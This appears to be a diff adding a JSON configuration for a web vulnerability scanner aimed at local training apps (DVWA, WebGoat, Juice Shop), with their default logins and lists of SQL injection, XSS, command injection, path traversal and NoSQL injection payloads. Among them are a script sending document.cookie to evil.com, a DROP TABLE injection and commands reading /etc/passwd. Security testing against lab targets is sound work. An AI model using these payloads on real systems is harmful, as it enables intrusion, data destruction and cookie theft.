@@ -1,0 +1,103 @@
+{
+    "alvos": [
+        {
+            "nome": "DVWA",
+            "url": "http://localhost/DVWA/",
+            "auth": {
+                "login_url": "http://localhost/DVWA/login.php",
+                "campos": {
+                    "username": "admin",
+                    "password": "password",
+                    "Login": "Login"
+                }
+            },
+            "páginas": [
+                "vulnerabilities/sqli/?id=1&Submit=Submit",
+                "vulnerabilities/xss_r/?name=test",
+                "vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit",
+                "vulnerabilities/sqli_blind/?id=1&Submit=Submit",
+                "vulnerabilities/upload/"
+            ]
+        },
+        {
+            "nome": "WebGoat",
+            "url": "http://localhost:8080/WebGoat/",
+            "auth": {
+                "login_url": "http://localhost:8080/WebGoat/login",
+                "campos": {
+                    "username": "guest",
+                    "password": "guest"
+                }
+            },
+            "páginas": [
+                "start.mvc#lesson/SqlInjection.lesson",
+                "start.mvc#lesson/CrossSiteScripting.lesson",
+                "attack?Screen=900&menu=900"
+            ]
+        },
+        {
+            "nome": "JuiceShop",
+            "url": "http://localhost:3000/",
+            "páginas": [
+                "rest/products/search?q=apple",
+                "rest/user/login",
+                "api/Products"
+            ]
+        }
+    ],
+    "payloads": {
+        "sqli": [
+            "' or 1=1--",
+            "1' UNION SELECT 1,2,3--",
+            "admin'--",
+            "1' OR '1'='1'",
+            "1'; DROP TABLE users--",
+            "1' UNION SELECT @@version--",
+            "1' ORDER BY 10--",
+            "1'; WAITFOR DELAY '0:0:5'--",
+            "admin' /*",
+            "' HAVING 1=1--"
+        ],
+        "xss": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(2)>",
+            "<svg onload=alert('XSS')>",
+            "<iframe src=javascript:alert(3)>",
+            "javascript:alert(document.cookie)",
+            "<body onload=alert('XSS')>",
+            "<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
+            "<img src='' onerror='alert(document.domain)'>"
+        ],
+        "cmd_injection": [
+            "127.0.0.1; ls",
+            "$(whoami)",
+            "`id`",
+            "127.0.0.1 | cat /etc/passwd",
+            "127.0.0.1 && dir",
+            ";ls -la",
+            "& whoami",
+            "127.0.0.1 && type C:\\Windows\\win.ini",
+            "127.0.0.1 | id"
+        ],
+        "path_traversal": [
+            "../../../etc/passwd",
+            "..\\..\\..\\Windows\\win.ini",
+            "file:///etc/passwd",
+            "/etc/passwd%00",
+            "C:\\Windows\\system.ini",
+            "....//....//....//etc/passwd",
+            "..//..//..//..//boot.ini"
+        ],
+        "nosqli": [
+            "{'$gt':''}",
+            "username[$ne]=admin&password[$ne]=",
+            "{\"username\":{\"$ne\":\"\"}}",
+            "admin'||'1'=='1",
+            "email={\"$regex\":\"admin\"}&password[\"$ne\"]=1"
+        ]
+    },
+    "tempos": {
+        "entre_requisições": 1.0,
+        "timeout": 10
+    }
+}
